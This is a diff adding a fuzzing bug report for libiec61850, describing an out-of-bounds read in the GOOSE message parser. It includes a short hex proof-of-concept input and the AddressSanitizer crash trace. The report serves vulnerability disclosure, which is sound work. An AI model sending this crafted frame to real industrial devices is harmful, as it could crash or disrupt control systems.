@@ -1,0 +1,35 @@
+issue: #509
+Summary:
+An Out-of-Bound Read vulnerability was discovered in the parseGooseMessage and parseGoosePayload functions of the goose_receiver.c file in the libiec61850 library through fuzzing. This vulnerability occurs when the size of the input data is 22 bytes.
+
+Root Cause:
+The vulnerability arises due to insufficient boundary checks when the input data size is exactly 22 bytes. The code fails to properly validate and handle the case when bufPos reaches the end of the buffer, leading to out-of-bounds memory access.
+
+Proof of Concept (PoC):
+0000 0000 0000 0000 0000 0000 88b8 0000 0000 0000 0000
+
+AddressSanitizer
+The AddressSanitizer (ASan) log shows:
+
+./fuzz_goose_parse poc-oobr-001.goose                                  
+INFO: Running with entropic power schedule (0xFF, 100).
+INFO: Seed: 1941454991
+INFO: Loaded 1 modules   (1694 inline 8-bit counters): 1694 [0x556316da7760, 0x556316da7dfe), 
+INFO: Loaded 1 PC tables (1694 PCs): 1694 [0x556316da7e00,0x556316dae7e0), 
+./fuzz_goose_parse: Running 1 inputs 1 time(s) each.
+Running: poc-oobr-001
+=================================================================
+==56280==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000176 at pc 0x556316d94425 bp 0x7ffca8eec5b0 sp 0x7ffca8eec5a8
+READ of size 1 at 0x503000000176 thread T0
+    #0 0x556316d94424 in parseGoosePayload /src/libiec61850/src/goose/goose_receiver.c:665:9
+    #1 0x556316d94424 in parseGooseMessage /src/libiec61850/src/goose/goose_receiver.c:1002:9
+    #2 0x556316d73e84 in LLVMFuzzerTestOneInput /src/libiec61850/build/../fuzz/fuzz_goose_parse.c:14:5
+    #3 0x556316c24cd0 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
+    #4 0x556316c0e814 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:327:6
+    #5 0x556316c142aa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:862:9
+    #6 0x556316c412f2 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
+    #7 0x7f0fed7d8d8f  (/lib/x86_64-linux-gnu/libc.so.6+0x29d8f) (BuildId: 962015aa9d133c6cbcfb31ec300596d7f44d3348)
+    #8 0x7f0fed7d8e3f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x29e3f) (BuildId: 962015aa9d133c6cbcfb31ec300596d7f44d3348)
+    #9 0x556316c052ed in _start (/home/user/oss-fuzz/build/out/libiec61850/fuzz_goose_parse+0xa92ed)
+SUMMARY: AddressSanitizer: heap-buffer-overflow /src/libiec61850/src/goose/goose_receiver.c:665:9 in parseGoosePayload
+==56280==ABORTING
